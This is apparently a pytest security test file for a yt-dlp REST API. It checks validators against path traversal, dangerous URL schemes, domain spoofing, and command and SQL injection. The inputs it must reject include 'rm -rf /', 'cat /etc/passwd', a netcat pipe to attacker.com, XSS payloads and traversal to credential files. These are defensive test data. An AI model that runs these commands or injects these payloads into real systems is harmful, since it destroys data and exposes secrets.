"""Security tests for the yt-dlp REST API.

This module contains comprehensive security tests covering:
- Path traversal prevention
- URL validation with malicious inputs
- API key authentication
- Sensitive data redaction
- Template sanitization

These tests satisfy Requirement 7, 9, 31, 33 and are MVP CRITICAL.
"""

from unittest.mock import MagicMock

import pytest

from app.core.template import TemplateProcessor
from app.core.validation import FormatValidator, URLValidator, url_validator
from app.middleware.auth import APIKeyAuth, hash_api_key


class TestPathTraversalPrevention:
    """Tests for path traversal attack prevention (Requirement 7, 31)."""

    @pytest.fixture
    def processor(self) -> TemplateProcessor:
        """Create template processor."""
        return TemplateProcessor(output_dir="/app/downloads")

    # Basic path traversal sequences
    @pytest.mark.parametrize(
        "malicious_path",
        [
            "../",
            "..\\",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//etc/passwd",
            ".../...//etc/passwd",
            "..././..././etc/passwd",
        ],
    )
    def test_dotdot_sequences_rejected(self, processor: TemplateProcessor, malicious_path: str):
        r"""Test that ../ and ..\\ sequences are rejected."""
        result = processor.validate_template(malicious_path)
        assert result.is_valid is False

    # Encoded path traversal attempts
    @pytest.mark.parametrize(
        "encoded_path",
        [
            "%2e%2e%2f",  # ../
            "%2e%2e/",  # ../
            "..%2f",  # ../
            "%2e%2e%5c",  # ..\
            "..%5c",  # ..\
            "%252e%252e%252f",  # Double encoded ../
        ],
    )
    def test_url_encoded_traversal_in_filename(
        self, processor: TemplateProcessor, encoded_path: str
    ):
        """Test that URL-encoded traversal is handled in filenames."""
        # When used as filename, these should be sanitized
        result = processor.sanitize_filename(encoded_path)
        # Result should not contain path separators
        assert "/" not in result
        assert "\\" not in result

    # Absolute path attempts
    @pytest.mark.parametrize(
        "absolute_path",
        [
            "/etc/passwd",
            "/var/log/auth.log",
            "C:\\Windows\\System32\\config\\SAM",
            "D:\\sensitive\\data.txt",
        ],
    )
    def test_absolute_paths_rejected(self, processor: TemplateProcessor, absolute_path: str):
        """Test that absolute paths are rejected in templates."""
        result = processor.validate_template(absolute_path)
        assert result.is_valid is False

    def test_unc_paths_sanitized(self, processor: TemplateProcessor):
        """Test that UNC paths are sanitized in filenames."""
        # UNC paths in filenames should have backslashes replaced
        unc_path = "\\\\server\\share\\file.txt"
        sanitized = processor.sanitize_filename(unc_path)
        assert "\\" not in sanitized

    # Null byte injection
    def test_null_byte_injection_rejected(self, processor: TemplateProcessor):
        """Test that null byte injection is prevented."""
        malicious = "safe.txt\x00../../etc/passwd"
        result = processor.validate_template(malicious)
        assert result.is_valid is False

        # Also test in filename sanitization
        sanitized = processor.sanitize_filename(malicious)
        assert "\x00" not in sanitized

    # Unicode normalization attacks
    @pytest.mark.parametrize(
        "unicode_attack",
        [
            ".\u002e/",  # Period + Unicode period
            "\u002e\u002e/",  # Two Unicode periods
            "．．/",  # Fullwidth periods
            "。。/",  # CJK periods
        ],
    )
    def test_unicode_normalization_attacks(self, processor: TemplateProcessor, unicode_attack: str):
        """Test that Unicode normalization attacks are handled."""
        result = processor.validate_template(unicode_attack)
        # Should either be rejected or the path traversal neutralized
        if result.is_valid:
            assert ".." not in result.processed_path

    # Long path traversal
    def test_very_long_traversal_sequence(self, processor: TemplateProcessor):
        """Test that extremely long path traversal sequences are caught."""
        # Try to escape many directories
        long_traversal = "../" * 50 + "etc/passwd"
        result = processor.validate_template(long_traversal)
        assert result.is_valid is False


class TestURLValidationSecurity:
    """Tests for URL validation security (Requirement 31)."""

    @pytest.fixture
    def validator(self) -> URLValidator:
        """Create URL validator."""
        return URLValidator()

    # Malicious URL schemes
    @pytest.mark.parametrize(
        "malicious_url",
        [
            "javascript:alert('XSS')",
            "javascript:eval(atob('...'))",
            "data:text/html,<script>alert('XSS')</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            "file:///etc/passwd",
            "file:///C:/Windows/System32/config/SAM",
            "vbscript:msgbox('XSS')",
            "about:blank",
        ],
    )
    def test_dangerous_schemes_blocked(self, validator: URLValidator, malicious_url: str):
        """Test that dangerous URL schemes are blocked."""
        result = validator.validate(malicious_url)
        assert result.is_valid is False

    # Domain spoofing attempts
    @pytest.mark.parametrize(
        "spoofed_url",
        [
            "https://youtube.com.evil.com/watch?v=abc",
            "https://youtube-com.attacker.com/watch?v=abc",
            "https://fake-youtube.com/watch?v=abc",
            "https://youtubecom/watch?v=abc",  # Missing dot
            "https://youtube.corn/watch?v=abc",  # Similar TLD
            "https://уoutube.com/watch?v=abc",  # Cyrillic 'y'
        ],
    )
    def test_domain_spoofing_rejected(self, validator: URLValidator, spoofed_url: str):
        """Test that domain spoofing attempts are rejected."""
        result = validator.validate(spoofed_url)
        assert result.is_valid is False

    # Protocol-relative URLs
    def test_protocol_relative_urls(self, validator: URLValidator):
        """Test handling of protocol-relative URLs."""
        # These should be handled safely (either rejected or domain properly validated)
        result = validator.validate("//youtube.com/watch?v=abc")
        assert isinstance(result.is_valid, bool)

    # URL with credentials
    @pytest.mark.parametrize(
        "cred_url",
        [
            "https://user:pass@youtube.com/watch?v=abc",
            "https://admin:admin@youtube.com/watch?v=abc",
        ],
    )
    def test_urls_with_credentials(self, validator: URLValidator, cred_url: str):
        """Test URLs with embedded credentials."""
        # Should be handled - either rejected or credentials stripped
        result = validator.validate(cred_url)
        assert isinstance(result.is_valid, bool)

    # Empty and null handling
    @pytest.mark.parametrize(
        "invalid_url",
        [
            "",
            "   ",
            None,
            "\x00",
            "\n\r\t",
        ],
    )
    def test_empty_and_null_urls_rejected(self, validator: URLValidator, invalid_url):
        """Test that empty, null, and whitespace URLs are rejected."""
        result = validator.validate(invalid_url)
        assert result.is_valid is False


class TestAPIKeyAuthenticationSecurity:
    """Tests for API key authentication security (Requirement 9, 33)."""

    @pytest.fixture
    def auth(self) -> APIKeyAuth:
        """Create auth with test keys."""
        return APIKeyAuth(api_keys=["valid-key-12345", "another-valid-key"])

    @pytest.fixture
    def mock_request(self) -> MagicMock:
        """Create mock request."""
        request = MagicMock()
        request.url.path = "/api/v1/info"
        request.client.host = "127.0.0.1"
        return request

    # Key validation
    def test_valid_key_accepted(self, auth: APIKeyAuth, mock_request: MagicMock):
        """Test that valid API key is accepted."""
        result = auth.authenticate(mock_request, "valid-key-12345")
        assert result is True

    def test_invalid_key_rejected(self, auth: APIKeyAuth, mock_request: MagicMock):
        """Test that invalid API key is rejected."""
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc_info:
            auth.authenticate(mock_request, "invalid-key")
        assert exc_info.value.status_code == 401

    def test_missing_key_rejected(self, auth: APIKeyAuth, mock_request: MagicMock):
        """Test that missing API key is rejected."""
        from fastapi import HTTPException

        with pytest.raises(HTTPException):
            auth.authenticate(mock_request, None)

    def test_empty_key_rejected(self, auth: APIKeyAuth, mock_request: MagicMock):
        """Test that empty API key is rejected."""
        from fastapi import HTTPException

        with pytest.raises(HTTPException):
            auth.authenticate(mock_request, "")

    # Excluded paths
    @pytest.mark.parametrize(
        "excluded_path",
        ["/health", "/liveness", "/readiness", "/docs", "/openapi.json"],
    )
    def test_excluded_paths_no_auth_required(
        self, auth: APIKeyAuth, mock_request: MagicMock, excluded_path: str
    ):
        """Test that excluded paths don't require authentication."""
        mock_request.url.path = excluded_path
        result = auth.authenticate(mock_request, None)
        assert result is True


class TestSensitiveDataRedaction:
    """Tests for sensitive data redaction in logs (Requirement 17A, 33)."""

    def test_api_key_hashed_not_plaintext(self):
        """Test that API keys are hashed, not logged in plaintext."""
        api_key = "super-secret-api-key-12345"
        hashed = hash_api_key(api_key)

        # Hash should not reveal key
        assert api_key not in hashed
        assert "secret" not in hashed
        assert "12345" not in hashed
        # Hash should be 8 chars
        assert len(hashed) == 8

    def test_hash_is_consistent(self):
        """Test that same key produces same hash."""
        key = "test-key"
        hash1 = hash_api_key(key)
        hash2 = hash_api_key(key)
        assert hash1 == hash2

    def test_different_keys_different_hashes(self):
        """Test that different keys produce different hashes."""
        hash1 = hash_api_key("key1")
        hash2 = hash_api_key("key2")
        assert hash1 != hash2

    def test_empty_key_safe_hash(self):
        """Test that empty/None keys have safe hash."""
        assert hash_api_key("") == "empty"
        assert hash_api_key(None) == "empty"

    def test_auth_error_no_key_in_message(self):
        """Test that auth errors don't contain the API key."""
        from fastapi import HTTPException

        auth = APIKeyAuth(api_keys=["valid-key"])
        request = MagicMock()
        request.url.path = "/api/v1/test"
        request.client.host = "127.0.0.1"

        with pytest.raises(HTTPException) as exc_info:
            auth.authenticate(request, "attempted-secret-key")

        # Error should not contain the attempted key
        assert "attempted-secret-key" not in str(exc_info.value.detail)
        assert "secret" not in str(exc_info.value.detail).lower()


class TestTemplateSanitizationEdgeCases:
    """Tests for template sanitization edge cases (Requirement 7)."""

    @pytest.fixture
    def processor(self) -> TemplateProcessor:
        """Create template processor."""
        return TemplateProcessor()

    # Illegal character handling
    @pytest.mark.parametrize(
        "illegal_filename",
        [
            'file<script>alert("xss")</script>.mp4',
            "file|pipe.mp4",
            "file:colon.mp4",
            'file"quote".mp4',
            "file?query.mp4",
            "file*star.mp4",
            "file\\backslash.mp4",
        ],
    )
    def test_illegal_characters_sanitized(
        self, processor: TemplateProcessor, illegal_filename: str
    ):
        """Test that illegal characters are sanitized."""
        result = processor.sanitize_filename(illegal_filename)
        # No illegal chars should remain
        for char in '<>:"/\\|?*':
            assert char not in result

    # Filename length limits
    def test_very_long_filename_truncated(self, processor: TemplateProcessor):
        """Test that very long filenames are truncated."""
        long_name = "a" * 500 + ".mp4"
        result = processor.sanitize_filename(long_name)
        assert len(result) <= processor.MAX_FILENAME_LENGTH
        # Extension should be preserved
        assert result.endswith(".mp4")

    # Windows reserved names
    @pytest.mark.parametrize(
        "reserved",
        ["CON", "PRN", "AUX", "NUL", "COM1", "LPT1", "con", "prn", "aux"],
    )
    def test_windows_reserved_names_handled(self, processor: TemplateProcessor, reserved: str):
        """Test that Windows reserved names are handled."""
        result = processor.sanitize_filename(reserved)
        # Should be prefixed or modified
        assert result.upper() != reserved.upper()

    # Control characters
    def test_control_characters_removed(self, processor: TemplateProcessor):
        """Test that control characters are removed."""
        filename = "file\x00\x01\x02\x03\x1fname.mp4"
        result = processor.sanitize_filename(filename)
        # No control chars should remain
        for i in range(32):
            assert chr(i) not in result

    # Edge cases
    def test_empty_filename_handled(self, processor: TemplateProcessor):
        """Test that empty filename returns safe default."""
        assert processor.sanitize_filename("") == "unnamed"
        assert processor.sanitize_filename("   ") == "unnamed"

    def test_dots_only_filename_handled(self, processor: TemplateProcessor):
        """Test that dots-only filenames are handled."""
        assert processor.sanitize_filename(".") == "unnamed"
        assert processor.sanitize_filename("..") == "unnamed"
        assert processor.sanitize_filename("...") == "unnamed"


class TestFormatIDValidationSecurity:
    """Tests for format ID validation security (Requirement 31)."""

    @pytest.fixture
    def validator(self) -> FormatValidator:
        """Create format validator."""
        return FormatValidator()

    # Command injection attempts
    @pytest.mark.parametrize(
        "malicious_format",
        [
            "22; rm -rf /",
            "22 && cat /etc/passwd",
            "22 | nc attacker.com 1234",
            "$(whoami)",
            "`id`",
            "22' OR '1'='1",
            "22/**/",
        ],
    )
    def test_command_injection_rejected(self, validator: FormatValidator, malicious_format: str):
        """Test that command injection attempts are rejected."""
        result = validator.validate_format_id(malicious_format)
        assert result.is_valid is False

    def test_valid_format_with_hyphens(self, validator: FormatValidator):
        """Test that format IDs with hyphens are valid (e.g., 22--)."""
        # Hyphens are valid in format IDs (used for HLS/DASH formats)
        result = validator.validate_format_id("22--")
        assert result.is_valid is True
        result = validator.validate_format_id("hls-720p-video")
        assert result.is_valid is True

    # SQL injection attempts
    @pytest.mark.parametrize(
        "sql_injection",
        [
            "'; DROP TABLE videos; --",
            "1 UNION SELECT * FROM users",
            "1' OR '1'='1",
        ],
    )
    def test_sql_injection_rejected(self, validator: FormatValidator, sql_injection: str):
        """Test that SQL injection attempts are rejected."""
        result = validator.validate_format_id(sql_injection)
        assert result.is_valid is False

    # Valid format IDs should pass
    @pytest.mark.parametrize(
        "valid_format",
        ["22", "137", "best", "bestvideo+bestaudio", "hls-720", "dash_1080p"],
    )
    def test_valid_formats_accepted(self, validator: FormatValidator, valid_format: str):
        """Test that valid format IDs are accepted."""
        result = validator.validate_format_id(valid_format)
        assert result.is_valid is True


class TestInputBoundaryConditions:
    """Tests for input boundary conditions."""

    def test_maximum_url_length(self):
        """Test handling of very long URLs."""
        # Create a very long URL
        long_url = "https://youtube.com/watch?v=abc" + "&x=y" * 1000
        result = url_validator.validate(long_url)
        # Should handle gracefully (either accept or reject, but not crash)
        assert isinstance(result.is_valid, bool)

    def test_unicode_in_url(self):
        """Test handling of Unicode in URLs."""
        unicode_url = "https://youtube.com/watch?v=日本語"
        result = url_validator.validate(unicode_url)
        # Should handle gracefully
        assert isinstance(result.is_valid, bool)

    def test_newlines_in_url(self):
        """Test that newlines in URLs are handled."""
        url_with_newline = "https://youtube.com\n/watch?v=abc"
        result = url_validator.validate(url_with_newline)
        # Should be handled safely (not crash)
        assert isinstance(result.is_valid, bool)

    def test_special_url_characters(self):
        """Test handling of special URL characters."""
        special_url = "https://youtube.com/watch?v=abc&title=hello%20world#section"
        result = url_validator.validate(special_url)
        assert result.is_valid is True  # This is a valid YouTube URL


class TestSecurityHeadersExpectations:
    """Tests verifying security header expectations in responses."""

    def test_401_includes_www_authenticate(self):
        """Test that 401 responses include WWW-Authenticate header."""
        from fastapi import HTTPException

        auth = APIKeyAuth(api_keys=["valid-key"])
        request = MagicMock()
        request.url.path = "/api/v1/test"
        request.client.host = "127.0.0.1"

        with pytest.raises(HTTPException) as exc_info:
            auth.authenticate(request, "invalid")

        assert exc_info.value.headers is not None
        assert "WWW-Authenticate" in exc_info.value.headers
        assert exc_info.value.headers["WWW-Authenticate"] == "ApiKey"
